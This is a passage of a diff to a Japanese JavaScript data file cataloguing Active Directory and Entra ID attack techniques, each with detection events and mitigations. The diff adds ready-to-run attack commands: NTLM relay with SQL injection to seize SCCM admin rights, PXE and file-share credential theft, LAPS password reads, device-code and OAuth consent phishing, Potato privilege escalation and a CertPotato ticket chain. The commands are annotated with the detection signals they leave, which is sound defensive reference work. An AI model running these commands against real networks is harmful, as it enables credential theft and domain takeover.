     "how": "Misconfiguration ManagerのTAKEOVER系(TAKEOVER-1〜9。例: サイトサーバのマシンアカウントをNTLMリレーしてサイトDB/SMS Providerへ、または管理点の権限昇格)でSCCM完全管理者(Full Administrator)を獲得する。あるいはCVE-2024-43468(MP_Locationの未認証SQLインジェクション, CVSS9.8, CISA KEV)でサイトDBにsysadmin権限のクエリを実行し、xp_cmdshellでサイトサーバ上のRCEに至る未認証経路も存在する。以後CMPivotやアプリ/スクリプト配布で任意コレクションにSYSTEMコマンドを配布し、NAAや管理点の資格情報を回収する。階層(CAS)では上位サイト掌握が全下位に波及する。",
     "tools": "SharpSCCM, sccmhunter, Misconfiguration Manager (TAKEOVER-*), ntlmrelayx (MSSQL/HTTP), PXEthief",
+    "cmd": [
+      {
+        "tool": "ntlmrelayx",
+        "t": "強制認証させたサイトサーバのマシンアカウントをサイトDBへリレーしRBAC_Adminsへ直接INSERT。テーブル名とSMS0001Rロールが決定打",
+        "q": "impacket-ntlmrelayx -smb2support -ts -ip 10.0.0.6 -t mssql://10.0.0.10 -q \"USE CM_PS1; INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) VALUES (0x010500000000000515000000AAAAAAAABBBBBBBBCCCCCCCC,'CORP\\attacker',0,0,'','','','','PS1'); INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'CORP\\attacker'),'SMS0001R','SMS00ALL','29');\""
+      },
+      {
+        "tool": "PetitPotam",
+        "t": "EFSRPCでサイトサーバに攻撃者リレーリスナーへの認証を強制。`-pipe efsr`が選択オプションとして残る",
+        "q": "python3 PetitPotam.py -pipe efsr 10.0.0.6 10.0.0.20"
+      },
+      {
+        "tool": "sccmhunter",
+        "t": "サイトサーバ/SMS Provider/MPなどSCCMロールをドメイン全体から列挙。リレー先選定に先行する偵察として必ず出現",
+        "q": "sccmhunter.py find -u svc_user -p 'Passw0rd!' -d corp.local -dc dc01.corp.local"
+      },
+      {
+        "tool": "SharpSCCM",
+        "t": "サイト掌握後にNetwork Access Account資格情報を回収。自己署名証明書での偽デバイス登録がMPのIISログに残る",
+        "q": "SharpSCCM.exe get secrets"
+      },
+      {
+        "tool": "PXEThief",
+        "t": "PXE経由の代替資格情報奪取。配布点への非対話ダウンロードのみでプロセスログよりネットワークキャプチャで見る",
+        "q": "python pxethief.py 2 10.0.0.15"
+      }
+    ],
     "detect": "サイトDB(MSSQL)への異常ログイン、サイトサーバマシンアカウントのNTLMリレー痕跡、SMS Adminロール(Full Administrator)の付与変更、CMPivot/大量配布の異常を監視。SCCM監査ログとMSSQL監査を相関。",
     "events": "4624/4648(MSSQL/サイト), 4672, SCCM/MSSQL監査ログ",
     "mitigate": "サイトサーバ/DBのNTLMをEPA・署名で保護し、サイトDBを専用ホストに分離。SMS ProviderとSQLの権限最小化、管理点でのNAA廃止(拡張HTTP/PKI移行)、Full Administratorロールの厳格管理と監査。",
@@ -8047,6 +13223,28 @@ AD.I18N.ja.attacks = [
     "summary": "SCCMのPXEブート(OSD)が有効な環境で、PXEメディアのポリシー暗号を突いてタスクシーケンス変数やネットワークアクセスアカウント(NAA)等の資格情報を抽出する。",
     "how": "PXE対応の配布点(DP)へブートを要求し、暗号化されたメディア(variables.dat/ポリシー)を取得。PXEパスワード未設定/弱設定なら復号し、タスクシーケンス内の資格情報・NAA・ドメイン参加アカウントを回収する。PXEthief等で自動化。",
     "tools": "PXEthief, sccmhunter, SharpSCCM, powerpxe",
+    "cmd": [
+      {
+        "tool": "PXEThief",
+        "t": "PXE対応配布点へブート要求し暗号化メディア(variables.dat)を取得。TFTP/HTTPの非対話取得でプロセス生成は最小限",
+        "q": "python pxethief.py 2 10.0.0.15"
+      },
+      {
+        "tool": "PXEThief",
+        "t": "既知/弱いPXEパスワードでメディアを復号しタスクシーケンス変数とNAA資格情報を平文化。モード番号`3`が復号実行の指紋",
+        "q": "python pxethief.py 3 variables.dat Passw0rd!"
+      },
+      {
+        "tool": "PXEThief",
+        "t": "パスワード不明時の代替復号モード。総当たりを伴うため実行ホストのCPU使用率上昇が気づかれやすい副次シグナル",
+        "q": "python pxethief.py 5 variables.dat"
+      },
+      {
+        "tool": "sccmhunter",
+        "t": "SMB経由でnaa.cerやPXEメディアを列挙・回収。通常のドメイン資格情報でのSMBセッションと外形上は区別しにくい",
+        "q": "sccmhunter.py smb -u svc_user -p 'Passw0rd!' -d corp.local -dc dc01.corp.local"
+      }
+    ],
     "detect": "DHCP/PXE要求の異常、DPへの不審なブート要求、NAA資格情報の異常使用を監視。PXEメディアアクセスのログを確認。",
     "events": "4624/4648(NAA使用), DHCP/WDSログ",
     "mitigate": "PXEに強固なパスワードを設定、可能ならPXE/OSDを無効化。NAAを廃止し拡張HTTP/PKIへ移行、タスクシーケンス内に資格情報を埋め込まない。DPをネットワーク分離。",
@@ -8087,6 +13285,33 @@ AD.I18N.ja.attacks = [
     "summary": "到達可能なファイル共有やSYSVOLを全文走査し、スクリプト・構成ファイル・接続文字列・KeePass/ini等に含まれる平文/準平文の資格情報を回収する。",
     "how": "認証済みユーザーで共有を列挙し、Snaffler/manspider等で拡張子・キーワード(password, connectionString, .kdbx, unattend.xml, web.config, *.ps1)を対象に走査。SYSVOLのログオンスクリプトやGPP以外の構成に埋め込まれた資格情報、機密ファイルを高速抽出する。",
     "tools": "Snaffler, PowerHuntShares, manspider, findstr/grep",
+    "cmd": [
+      {
+        "tool": "Snaffler",
+        "t": "到達可能な共有を自動列挙しstdoutへ即時出力。`Snaffler.exe`という実行ファイル名自体が強いシグナルになる",
+        "q": "Snaffler.exe -s -o snaffler.log"
+      },
+      {
+        "tool": "Snaffler",
+        "t": "ドメイン指定で全コンピュータ列挙から共有走査まで一括実施。短時間に多数ホストへ張られる445接続が横断的シグナル",
+        "q": "Snaffler.exe -d corp.local -s -v info -o snaffler.log"
+      },
+      {
+        "tool": "MANSPIDER",
+        "t": "共有内のファイル内容を正規表現でgrep。`-c`(content)でpasswordや秘密鍵ヘッダを直接検索しSYSVOL含む全共有を横断する",
+        "q": "manspider dc01.corp.local -c passw BEGIN -e ps1,xml,ini,config -d corp.local -u svc_user -p 'Passw0rd!'"
+      },
+      {
+        "tool": "NetExec",
+        "t": "`-M spider_plus`で全共有のファイル一覧・内容を再帰収集。`DOWNLOAD_FLAG=True`で実ファイルを持ち出す挙動が最終シグナル",
+        "q": "netexec smb 10.0.0.0/24 -u svc_user -p 'Passw0rd!' -M spider_plus -o DOWNLOAD_FLAG=True"
+      },
+      {
+        "tool": "PowerHuntShares",
+        "t": "ドメイン参加端末から全共有のACLとリスクを棚卸し。Snafflerと異なり内容ではなく権限設定の甘さを可視化する",
+        "q": "Invoke-HuntSMBShares -Threads 100 -OutputDirectory C:\\Temp"
+      }
+    ],
     "detect": "単一アカウントによる多数共有への広範なファイルアクセス(5145大量)、SYSVOL/共有の再帰列挙、Snaffler特有のアクセスパターンを検知。ハニーファイル/カナリアトークンで早期検知。",
     "events": "5145(共有オブジェクトアクセス), 5140, 4663",
     "mitigate": "共有の棚卸しと最小権限化(アクセス過多の是正)、構成ファイルからの平文資格情報排除、SYSVOLスクリプトの秘密情報除去。DLP/ファイル監査とハニーファイル配置。",
@@ -8127,6 +13352,28 @@ AD.I18N.ja.attacks = [
     "summary": "現行のWindows LAPS(2023+)が管理する msLAPS-Password / msLAPS-EncryptedPassword を読み取り、暗号化版はDPAPI-NGで復号してローカル管理者パスワードを取得する。旧ms-Mcs-AdmPwd(平文)とは別属性・別防御面。",
     "how": "対象コンピュータオブジェクトのLAPS属性へのRead権限を持つプリンシパルで、平文ならmsLAPS-Passwordを直接読取。暗号化(msLAPS-EncryptedPassword)なら、暗号化先に指定されたSID(既定Domain Admins等)またはそのグループのコンテキストでDPAPI-NG復号する。パスワード履歴(msLAPS-EncryptedPasswordHistory)やDSRMバックアップからの読み出しも狙う。",
     "tools": "LAPSToolkit, Get-LapsADPassword, NetExec (laps), PowerView, bloodyAD",
+    "cmd": [
+      {
+        "tool": "PowerShell",
+        "t": "公式LAPSモジュールでmsLAPS-EncryptedPasswordをDPAPI-NGで自動復号。cmdlet名がそのまま4104に残る",
+        "q": "Get-LapsADPassword -Identity WKSTN01 -AsPlainText"
+      },
+      {
+        "tool": "NetExec",
+        "t": "単一LDAPセッションで読める全端末分のLAPSパスワードを一括取得。ヘルプデスクの単発照会と違い大量取得が異常",
+        "q": "nxc ldap dc01.corp.local -u svc_user -p 'Passw0rd!' -M laps"
+      },
+      {
+        "tool": "PowerView",
+        "t": "公式cmdletを経由せず属性を直接LDAP取得。`mslaps-password`を含む検索フィルタ/属性リストがネットワーク側の手掛かり",
+        "q": "Get-DomainComputer -Properties dnshostname,'mslaps-password' | Where-Object {$_.'mslaps-password'}"
+      },
+      {
+        "tool": "bloodyAD",
+        "t": "Python実装での同等のLDAP属性取得。Linux発のクエリのため端末プロセスログは残らない",
+        "q": "bloodyAD --host dc01.corp.local -d corp.local -u svc_user -p 'Passw0rd!' get object WKSTN01$ --attr mslaps-password"
+      }
+    ],
     "detect": "LAPS属性(msLAPS-Password/msLAPS-EncryptedPassword)へのLDAP読取(4662)、想定外プリンシパルによる復号、ExtendedRights保有者の監査。BloodHoundでReadLAPSPassword到達性を評価。",
     "events": "4662(LAPS属性アクセス), 4624",
     "mitigate": "LAPS属性のReadを最小限の管理者に限定し定期棚卸し。暗号化(DPAPI-NG)を有効化し復号可能プリンシパルを絞る、パスワード履歴と自動ローテーションを運用、DSRM/バックアップ経路を保護。",
@@ -8167,6 +13414,28 @@ AD.I18N.ja.attacks = [
     "summary": "Entra ID(Azure AD)のOAuth 2.0 Device Authorization Grantを悪用し、被害者に正規のmicrosoft.com/devicelogin のコードを入力させてアクセス/リフレッシュトークンを窃取するフィッシング。",
     "how": "攻撃者が /devicecode エンドポイントで Device Code Flow を開始して user_code/device_code を取得し、正規の microsoft.com/devicelogin URL とコードを被害者に提示する（著名人になりすまして信頼関係を築いた上で、Teams 会議招待や WhatsApp/Signal で誘導）。被害者が自分の資格情報+MFA で承認すると、攻撃者は /token をポーリングしてアクセス/リフレッシュトークンを取得し、以後トークンで M365/Azure へアクセスする（例：Microsoft Graph で password/secret/gov 等のキーワードでメールボックスを探索・窃取し、他ユーザへ横展開フィッシングを送信）。誘導先が正規 MS ドメインで MFA も本人が通すため騙されやすい。実運用例：Storm-2372（Microsoft が 2025-02 公表、2024-08 以降活動、ロシア関与と評価）が政府・NGO・IT・通信・防衛等を大規模に侵害。公表から約24時間以内に手法を高度化し、client_id を Microsoft Authentication Broker（29d9ed98-a469-4536-ade2-f981bc1d605e）に切替えてデバイス登録サービス用のリフレッシュトークンを取得→攻撃者制御のデバイスを Entra ID に登録→Primary Refresh Token(PRT) を取得し、広範かつ永続的なアクセスへ昇格する（デバイス登録/PRT 悪用へ連鎖、技術236/208 参照）。Microsoft はその後、Conditional Access の「認証フロー/デバイスコードフロー」許可制御を提供し、本フローをブロック可能にした。",
     "tools": "TokenTactics, AADInternals, roadtx, o365-attack-toolkit",
+    "cmd": [
+      {
+        "tool": "PowerShell",
+        "t": "device_authorization_grantを直接叩きuser_code/device_codeを取得。client_idが正規Microsoft製アプリの値である点が誘導を成立させる",
+        "q": "Invoke-RestMethod -Uri \"https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode\" -Method POST -Body @{client_id='1b730954-1685-4b74-9bfd-dac224a7b894'; scope='https://graph.microsoft.com/.default offline_access'}"
+      },
+      {
+        "tool": "TokenTactics",
+        "t": "被害者のコード入力完了をポーリングしaccess/refresh tokenを取得。既定でTokenLog.logへ記録されるため攻撃者端末側にも痕跡が残る",
+        "q": "Get-AzureToken -Client MSGraph"
+      },
+      {
+        "tool": "GraphRunner",
+        "t": "同種のデバイスコード取得をGraphRunnerのCAPSモジュールで実行",
+        "q": "Invoke-CAPSDeviceCodeAuth"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "Storm-2372が実証したclient_idをMicrosoft Authentication Brokerへ切替えたリクエスト。以後のデバイス登録/PRT奪取に直結するためこのclient_id自体が高忠実度シグナル",
+        "q": "Invoke-RestMethod -Uri \"https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode\" -Method POST -Body @{client_id='29d9ed98-a469-4536-ade2-f981bc1d605e'; scope='https://graph.microsoft.com/.default offline_access'}"
+      }
+    ],
     "detect": "Entraサインインログでdevice code認証(protocol=deviceCode)の異常、想定外デバイス/位置からのトークン発行、短時間の同一user_code承認を監視。Microsoft Authentication Broker の client_id(29d9ed98-a469-4536-ade2-f981bc1d605e) を用いたトークン要求に続く、同一ユーザの新規デバイス登録・PRT 発行（Storm-2372 の昇格チェーン）を検知する。device code サインインを、後続の監査ログ「デバイスの登録/追加」イベントや Graph でのメールボックス探索と相関させる。Identity Protection のリスク検知（匿名IP・脅威インテリジェンス・見慣れないサインイン）や Microsoft 公開の KQL ハンティングクエリを活用。",
     "events": "Entra Sign-in logs(Device Code), Identity Protection リスク",
     "mitigate": "専用の Conditional Access「認証フロー」許可制御（一般提供済み）で、不要な場所ではデバイスコードフローをブロックし、必要なユーザ/アプリ（CI/CD・Azure CLI・IoT）のみ例外とする（Microsoft は可能な限りブロックを推奨）。約2024-09 以降、全リソース対象の認証フローポリシーはデバイス登録サービスにも適用されるため、device code でデバイス登録を正規利用する場合は当該リソースを除外する。デバイス登録制限で Entra ID にデバイス登録できる主体を限定し（PRT 昇格を抑止）、フィッシング耐性MFA(FIDO2/パスキー)とトークン保護を適用、リスクベースサインインでブロックする。侵害が疑われる場合はリフレッシュトークンを失効(revokeSignInSessions)し再認証を強制。デバイスコードプロンプトに関するユーザ教育も行う。",
@@ -8207,6 +13476,28 @@ AD.I18N.ja.attacks = [
     "summary": "悪意あるEntraアプリ登録への同意(OAuth consent)を被害者に承認させ、Graph API等の委任権限(Mail.Read/Files.ReadWrite等)を得て、パスワード/MFA無しでデータへ永続アクセスする。",
     "how": "攻撃者がマルチテナントのアプリを登録し、正規のMicrosoft同意画面へ誘導。被害者が同意すると、そのユーザーのスコープでリフレッシュトークンが発行され、以後アプリとしてMail/Filesへアクセスできる。ユーザー同意が許可されたテナントで成立し、パスワード変更・MFAでは無効化されない(同意の取り消しが必要)。",
     "tools": "365-Stealer, GraphRunner, o365-attack-toolkit",
+    "cmd": [
+      {
+        "tool": "GraphRunner",
+        "t": "悪性マルチテナントアプリを登録し同意フィッシング用URLを生成。生成されたアプリ名がAuditLogsの`Add application`に残る",
+        "q": "Invoke-InjectOAuthApp -AppName \"Win Defend for M365\" -ReplyUrl \"https://windefend.azurewebsites.net\" -scope \"openid\",\"Mail.Read\",\"email\",\"profile\",\"offline_access\" -Tokens $tokens"
+      },
+      {
+        "tool": "Graph API",
+        "t": "正規同意エンドポイントへの誘導リンク。scopeとprompt=consentの組み合わせがサインインログのRequestedResourceに残る",
+        "q": "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=<attacker-app-id>&response_type=code&redirect_uri=https://windefend.azurewebsites.net&scope=Mail.Read+Files.ReadWrite+offline_access&prompt=consent"
+      },
+      {
+        "tool": "365-Stealer",
+        "t": "同意フィッシング専用ツールキット。管理パネル経由での運用が中心でCLIオプションは頻繁に変わるため固定コマンドでの検知は困難",
+        "q": "python 365-Stealer.py --config phishing_app.json"
+      },
+      {
+        "tool": "GraphRunner",
+        "t": "収穫後にアプリを削除し痕跡を消す動作。AuditLogsに`Delete application`が残るため削除操作自体が検知点になる",
+        "q": "Invoke-DeleteOAuthApp -AppId <attacker-app-id> -Tokens $tokens"
+      }
+    ],
     "detect": "Entra監査ログで新規サービスプリンシパル/OAuth同意付与(Consent to application)、リスクの高い委任権限の付与、未検証アプリへの同意を監視。Graphの異常アクセスを相関。",
     "events": "Entra Audit(Consent to application / Add delegated permission grant=oauth2PermissionGrant〔委任〕 / Add app role assignment〔アプリ権限の場合〕), Defender for Cloud Apps アラート",
     "mitigate": "ユーザー同意を管理者承認ワークフローに制限(admin consent required)、発行元未検証アプリをブロック。既存の同意/OAuth付与を定期棚卸しし不審アプリを取り消す。アプリガバナンス(Defender for Cloud Apps)を導入。",
@@ -8247,6 +13538,33 @@ AD.I18N.ja.attacks = [
     "summary": "SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege を保持するサービスアカウント（IIS AppPool、MSSQL、NETWORK/LOCAL SERVICE 等）から、SYSTEM 権限のプロセスをローカルの RPC/DCOM/名前付きパイプへ NTLM 認証させて誘導し、そのトークンを窃取・複製して SYSTEM に昇格するローカル権限昇格（LPE）技術群。Web/DB サーバーの限定的な侵入点を即座に完全乗っ取りへ変える定番手口であるため重要。",
     "how": "前提：対話シェル（Web シェル、xp_cmdshell、デシリアライズ等）を SeImpersonatePrivilege もしくは SeAssignPrimaryTokenPrivilege を持つコンテキストで実行できること。既定でこれらの特権を持つのは IIS w3wp.exe（AppPool ID）、sqlservr.exe、NT AUTHORITY\\NETWORK SERVICE / LOCAL SERVICE、多くのサービスアカウント。`whoami /priv` で特権有無を確認する。中核プリミティブ＝「認証誘導（coercion）＋トークン偽装」：攻撃者が制御するローカルエンドポイント（名前付きパイプまたは偽 OXID リゾルバ経由の DCOM/RPC）に SYSTEM プロセスを NTLM 認証させ、返ってきた SYSTEM トークンを SeImpersonate で複製し CreateProcessWithTokenW / CreateProcessAsUser で任意プロセスを SYSTEM 起動する（=T1134.001 トークン偽装/窃取 → T1134.002 トークンでのプロセス生成）。変種：PrintSpoofer は Print Spooler の RPC（\\pipe\\spoolss、RpcRemoteFindFirstPrinterChangeNotificationEx）で誘導。RoguePotato は port 135 の偽 OXID リゾルバ（要リダイレクタ、socat 等で 127.0.0.1:135→attacker:9999）で JuicyPotato を Win10 1809+/2019 上に復活。JuicyPotato は BITS/特定 CLSID の DCOM を悪用（1809 以降で既定不可）。EfsPotato/SharpEfsPotato は MS-EFSR（\\pipe\\lsarpc・efsrpc）を悪用。GodPotato は RPCSS 内の偽 OXID で Server 2012〜2022 を広くカバー。DCOMPotato は既定認証レベルの特定 DCOM サービス、PrintNotifyPotato は PrintNotify サービスを悪用。典型実行例：`PrintSpoofer.exe -i -c cmd`、`GodPotato.exe -cmd \"cmd /c whoami\"`、`RoguePotato.exe -r <redirIP> -e \"cmd.exe\" -l 9999`、`SharpEfsPotato.exe`。",
     "tools": "PrintSpoofer, RoguePotato, JuicyPotato, JuicyPotatoNG, GodPotato, SweetPotato, EfsPotato / SharpEfsPotato, DCOMPotato, PrintNotifyPotato, socat（135ポートリダイレクタ）",
+    "cmd": [
+      {
+        "tool": "PrintSpoofer",
+        "t": "Print SpoolerのRPC名前付きパイプでSYSTEM認証を誘導しトークンを窃取。`-i -c`とspoolssへのRPC呼び出しが手掛かり",
+        "q": "PrintSpoofer.exe -i -c cmd"
+      },
+      {
+        "tool": "GodPotato",
+        "t": "RPCSS内の偽OXIDでServer 2012~2022を広く突く。`-cmd`引数とWeb/DBサービスがcmd.exeを生む親子関係が手掛かり",
+        "q": "GodPotato.exe -cmd \"cmd /c whoami\""
+      },
+      {
+        "tool": "RoguePotato",
+        "t": "外部135ポートの偽OXIDリゾルバへ誘導しSYSTEM認証を奪う。攻撃者IPへの135番アウトバウンドが相関の決め手",
+        "q": "RoguePotato.exe -r 10.0.0.50 -e \"cmd.exe /c whoami\" -l 9999"
+      },
+      {
+        "tool": "EfsPotato",
+        "t": "MS-EFSRのEfsRpcOpenFileRawをlsarpcパイプ経由で悪用。Spooler停止/パッチ済み環境でも成立する代替経路",
+        "q": "EfsPotato.exe \"whoami\" lsarpc"
+      },
+      {
+        "tool": "SweetPotato",
+        "t": "複数のPotato系エクスプロイトを`-e`で切替える統合ツール。既定はPrintSpoofer相当のRPC誘導",
+        "q": "SweetPotato.exe -e PrintSpoofer -p cmd.exe -a \"/c whoami\""
+      }
+    ],
     "detect": "最有力シグナルは親子プロセスの権限逆転：サービスアカウント（w3wp.exe / sqlservr.exe / AppPool ID / NETWORK・LOCAL SERVICE）が親で、子プロセス（cmd.exe / powershell.exe / whoami.exe 等）が NT AUTHORITY\\SYSTEM として実行される 4688。誘導に伴うローカル NTLM 認証（4624 Type3、送信元がループバック/同一ホスト、認証パッケージ NTLM）。「機密特権の使用」監査を有効にしていれば SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege の 4673。名前付きパイプ生成（Sysmon 17/18：\\spoolss、\\lsarpc、\\efsrpc、\\epmapper や乱数パイプ）。RoguePotato はローカル 127.0.0.1:135 への非 RPCSS プロセスからの接続（Sysmon 3）。MDE では DeviceEvents の ProcessPrimaryTokenModified / SensitiveApiCall（OpenProcessApiCall 含む）、DeviceProcessEvents の親子権限逆転が有効。テレメトリ源：Windows Security 監査、Sysmon（1/3/17/18）、MDE Device* テーブル、EDR プロセス系譜。",
     "events": "4688(親=w3wp/sqlservr等サービスアカウント→子=SYSTEM), 4624(Type3/NTLM/ループバック認証), 4673(SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege 機密特権使用/要監査有効), Sysmon 17/18(名前付きパイプ \\spoolss/\\lsarpc/\\efsrpc), Sysmon 3(127.0.0.1:135 RoguePotato)",
     "mitigate": "根本策は不要な SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege の剥奪と権限最小化。IIS AppPool は既定の ApplicationPoolIdentity のまま高権限化しない、サービスアカウントは gMSA + 必要最小限のログオン権利で運用。Web/DB アプリの前段脆弱性（RCE・デシリアライズ・アップロード）を塞ぎ、対話シェル取得自体を防ぐ。Print Spooler が不要なサーバー（特に DC/メンバーサーバー）は Spooler サービスを停止（PrintSpoofer/PrintNotifyPotato 対策）。RoguePotato 対策として外向き 135/tcp の下り・任意リダイレクタ通信をホスト境界で制限。攻撃ツールへの WDAC/AppLocker とアンチウイルス（多くの Potato バイナリは検知される）。「機密特権の使用」「プロセス作成（コマンドライン記録）」監査を有効化し、サービスアカウント→SYSTEM の権限逆転を SIEM 相関ルール化。最新 OS への更新（JuicyPotato 既定経路は 1809 以降で無効）。",
@@ -8292,6 +13610,33 @@ AD.I18N.ja.attacks = [
     "summary": "CertPotato は、Windows の仮想/サービスアカウント（NETWORK SERVICE、LOCAL SERVICE、NT SERVICE\\、IIS APPPOOL\\）がネットワーク上ではコンピューターアカウント（MACHINE$）として認証する性質を悪用し、AD CS の既定 Machine テンプレートでマシン証明書を取得→PKINIT でマシン TGT を得て→S4U2self で自ホストの SPN に対しローカル Administrator になりすまし、サービスアカウントから SYSTEM 相当へローカル権限昇格する手法である。",
     "how": "前提: ドメイン参加ホスト上で仮想/サービスアカウント（例: Web シェル経由の IIS APPPOOL\\、MSSQL の NETWORK SERVICE、任意の NT SERVICE\\ サービス）としてコード実行を得ていること。追加でエンタープライズ CA が稼働し、既定の Machine/Computer テンプレート（Domain Computers に登録権限）が公開されていること。ローカルでは低権限だが、鍵となる原理は「これら仮想アカウントはネットワーク認証時にホストのマシンアカウント資格情報を提示する」点。手順: (1) サービスアカウントのコンテキストのまま ICertPassage(MS-ICPR) RPC 経由で CA にマシン証明書を要求する。認証は自動的に MACHINE$ として行われるため発行される: Certify.exe request /ca:CA01\\corp-CA /template:Machine（Linux は Certipy）。(2) 取得した PFX で PKINIT による TGT を要求: Rubeus.exe asktgt /user:SRV01$ /certificate:cert.pfx /password:xxx /ptt（または PKINITtools の gettgtpkinit.py）。(3) マシン TGT で S4U2self を実行し、ローカルの特権ユーザーを自ホストの SPN へなりすます: Rubeus.exe s4u /self /impersonateuser:Administrator /altservice:cifs/SRV01.corp.local,host/SRV01.corp.local /user:SRV01$ /ticket:tgt.kirbi /ptt（Impacket は getST.py -self -impersonate Administrator）。(4) 得た Administrator のサービスチケットでローカルホストへ管理者としてアクセス→実質 SYSTEM。中核プリミティブは「仮想アカウント=マシンアカウントのネットワーク ID」＋「証明書→PKINIT→S4U2self」。",
     "tools": "Certify, Rubeus, Certipy, PKINITtools (gettgtpkinit.py), Impacket getST.py, Mimikatz",
+    "cmd": [
+      {
+        "tool": "Certify",
+        "t": "サービス/仮想アカウントのコンテキストでMachineテンプレートを申請。ICertPassage RPC経由の要求がCA側4887にNETWORK SERVICE等の名義で残る",
+        "q": "Certify.exe request --ca CA01.corp.local\\corp-CA --template Machine --machine"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "取得マシン証明書でPKINIT TGTを取得しセッションへ注入。4768のクライアント名がホスト自身のマシンアカウントである点が起点",
+        "q": "Rubeus.exe asktgt /user:SRV01$ /certificate:cert.pfx /password:'Passw0rd!' /ptt"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "マシンTGTでS4U2selfを実行しローカルAdministratorへなりすまし。4624直後のS4U2self特有の4769相関が鍵",
+        "q": "Rubeus.exe s4u /self /impersonateuser:Administrator /altservice:cifs/SRV01.corp.local,host/SRV01.corp.local /user:SRV01$ /ticket:tgt.kirbi /ptt"
+      },
+      {
+        "tool": "Impacket",
+        "t": "Linux側でS4U2selfのみを実行しSPNへの偽装済みチケットを取得。端末側テレメトリは無くDCの4769のみで検知",
+        "q": "getST.py -impersonate Administrator -self -altservice 'cifs/SRV01.corp.local' 'corp.local/SRV01$:Passw0rd!'"
+      },
+      {
+        "tool": "PKINITtools",
+        "t": "マシン証明書からのTGT取得をLinux側で完結。後続のS4U2selfと合わせDCログでのみ追跡可能",
+        "q": "python gettgtpkinit.py corp.local/SRV01$ -cert-pfx cert.pfx -pfx-pass 'Passw0rd!' srv01.ccache"
+      }
+    ],
     "detect": "CA 上の 4886/4887（証明書要求・発行）でマシンアカウントが証明書を取得した記録を、直後の DC 上 PKINIT ログオンと相関させる。DC の 4768 で PreAuthType=16（証明書事前認証）かつ Certificate Information フィールドが埋まったマシンアカウント（$ 終端）のイベントは異常度が高い（通常マシンは PKINIT を使わない）。続く 4769 で ServiceName がそのマシンアカウント自身、TargetUserName が Administrator 等の人間の特権ユーザー＝S4U2self の痕跡。エンドポイントでは、w3wp.exe / sqlservr.exe など仮想アカウントで動くプロセスから Rubeus.exe / Certify.exe / Certipy が生成される親子関係、および asktgt/s4u/self/impersonateuser/certificate といったコマンドライン。テレメトリ源: AD CS セキュリティログ、DC の Kerberos 監査、MDE プロセス/ネットワーク、MDI の証明書ベース認証検知。証明書発行→PKINIT→S4U が数分内に連鎖する点が最も強い指標。",
     "events": "4886/4887(CA: 証明書要求・発行, Requester=MACHINE$), 4768(DC: PKINIT/証明書ログオン, PreAuthType=16), 4769(DC: S4U2self, Service=MACHINE$→Target=Administrator), 4624(Type3 マシンアカウント), 4688(Rubeus/Certify/Certipy 実行)",
     "mitigate": "AD CS テンプレートの堅牢化: 不要な Machine/Computer テンプレートの公開停止、登録権限を必要な端末のみに制限、CA の監査（4886/4887）を有効化。KB5014754 に基づく強力な証明書マッピング（StrongCertificateBindingEnforcement=2）で証明書と認証の紐付けを厳格化し、CA 監査と PKINIT 4768 の監視を実装。攻撃の初期段階を潰すのが本質: 悪用可能なサービス（脆弱な Web アプリ等）の RCE を排除し、サービスは最小権限の gMSA で運用、Tier0 分離。S4U2self 自体は Kerberos 仕様のため無効化できないので、マシンアカウントの PKINIT 使用・マシンが自ホストの SPN へ人間特権ユーザーの S4U を要求する挙動を検知/アラート化する。CA を Tier0 資産として扱い、レイヤ分離する。",
@@ -8337,6 +13682,38 @@ AD.I18N.ja.attacks = [
     "summary": "gMSA/dMSA の msDS-GroupMSAMembership（PrincipalsAllowedToRetrieveManagedPassword）への書込権限を悪用し、攻撃者が制御するプリンシパルを許可リストに追加して管理パスワード(msDS-ManagedPassword)をLDAP経由で取得し、そのNTハッシュを算出して多くの場合高権限なサービスアカウントへ成りすます ACL 悪用型の特権昇格手法。",
     "how": "【前提権限】対象 gMSA オブジェクトの msDS-GroupMSAMembership 属性への WriteProperty、または gMSA オブジェクトに対する WriteDACL/WriteOwner/GenericAll/GenericWrite（いずれも当該属性の値またはセキュリティ記述子を書換可能）。BloodHound の WriteGMSAPassword エッジで到達可能性を列挙。\n【手順】(1) 攻撃者が制御する computer/user を許可リストに追加: `Set-ADServiceAccount svc_gmsa -PrincipalsAllowedToRetrieveManagedPassword attacker_host$`、または PowerView `Set-DomainObject -Identity svc_gmsa -Set @{'msds-groupmsamembership'=<SDDLバイト>}`。(2) 追加したプリンシパルの資格で、封印(sign&seal/LDAPS)された LDAP 接続越しに算出属性 msDS-ManagedPassword を読取り、MSDS-MANAGEDPASSWORD_BLOB の現在パスワードから NTLM ハッシュを算出（GMSAPasswordReader / gMSADumper.py / NetExec --gmsa / DSInternals ConvertFrom-ADManagedPasswordBlob）。(3) 得た NT ハッシュで Pass-the-Hash / OverPass-the-Hash（Rubeus, Impacket）を実行し gMSA として認証。gMSA は AD CS・SQL・委任等の高権限サービスを担うことが多く昇格に直結。\n【主要プリミティブ】書換可能な許可リストにリーダーを追加 → DC 生成パスワードの正規リーダー化 → リセット不要かつパスワード自動ローテーション後も再取得可能でステルス性が高い。\n【dMSA/BadSuccessor 変種】OU への CreateChild（msDS-DelegatedManagedServiceAccount 作成権）または既存 dMSA への Write があれば、dMSA を新規作成し msDS-ManagedAccountPrecededByLink に標的アカウントの DN を設定、msDS-DelegatedMSAState を（正規移行は 1 から開始するのに対し）いきなり 2＝移行完了へ設定する。以後 dMSA として認証すると KDC が KERB-DMSA-KEY-PACKAGE で移行元の PAC/鍵を発行し、対象オブジェクトに触れず・グループ変更や被害者ログオンを伴わずに成りすませる（Windows Server 2025、ドメイン内に 2025 DC が 1 台でも成立）。Microsoft は CVE-2025-53779（Windows Kerberos EoP, CVSS 7.2, Akamai Yuval Gordon 発見）として 2025-08-12 に修正（KDC 側で dMSA 